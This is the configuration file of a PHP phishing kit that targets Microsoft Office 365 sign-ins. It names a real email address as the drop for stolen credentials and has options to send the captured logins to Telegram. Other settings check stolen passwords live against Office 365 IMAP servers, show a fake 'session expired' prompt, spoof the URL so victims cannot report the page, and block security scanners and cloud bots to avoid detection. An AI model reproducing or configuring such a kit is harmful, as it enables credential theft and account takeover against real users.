<?php

//////////////////////////////////CONFIG////////////////////////////////////////
$recipient = "olasebikansam2020@yahoo.com"; // YOUR EMAIL HERE
$password  = '123'; // PASSWORD TO DECRYPT, CAN BE CHANGED
////////////////////////////////////////////////////////////////////////////////
$style ='new'; // NEW FOR THE NEW DESIGN, OLD FOR THE OLD DESIGN
$truelogin = 1; // ENABLE / DISABLE TRUE LOGIN
$GETINCORRECT = 1; // GET INCORRECT LOGINS IF TRUE LOGIN ENABLED
$SESSIONEXPIRED = 1; // ENABLE / DISABLE SESSION EXPIRED
$EXPIREDTEXT = "Sorry, your sign-in timed out. Please sign in again."; // SESSION EXPIRED TEXT IF ENABLED
$REDGHOST = 1; // ENABLE / DISABLE URL SPOOFING SO VICTIMS CANT REPORT
////////////////////////////////////////////////////////////////////////////////
$savelog = 1; // SAVE LOGS TO CPANEL
$sendlog = 1; // SEND LOGS TO EMAIL
$Tele_bot = 0;  //SENDS RESULTS TO TELEGRAM
$token = ''; // BOT TOKEN
$chat_id = ''; // GROUP CHAT ID
////////////////////////////////////////////////////////////////////////////////
$BLOCKAWS = 0; // BLOCK AWS AND AMAZON BOTS
$BLOCKIE = "0"; // BLOCK OLD BROWSERS MOSTLY BOTS INCLUDING INTERNET EXPLORER
$BLOCKIPRANGE = "1"; // BLOCK IP RANGE, CAN BE EDITED IN IPRAGE.PHP
$BLOCKOTHERBOTS = "1"; // BLOCK OTHER BOTS AN BE EDITED IN OTHERB.PHP
////////////////////////////////////////////////////////////////////////////////
$One_Time_Access = 0; // ONE TIME ACCESS, BLOCKS VICTIMS FROM SUBMITTING AGAIN
$api1 = "{outlook.office365.com:993/ssl}"; // ACTIVE ACTION API, IF IT DOESNT WORK COPY API2 TO API1
$api2 = "{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX"; // THIS IS OFFICE VIENNA IP 40.101.54.2 WORKS IF ABOVE FAILS
$over = 'https://sender.office.com'; // THE FINISH URL CAN BE CHANGED, YOU CAN ALSO USE THE URLS BELOW TO LOG THEM OUT
// https://login.microsoftonline.com/3b5c2832-4b4d-4b6a-aa14-ffb05086b26c/oauth2/logout

/////////////////////////////////REDSON/////////////////////////////////////////
?>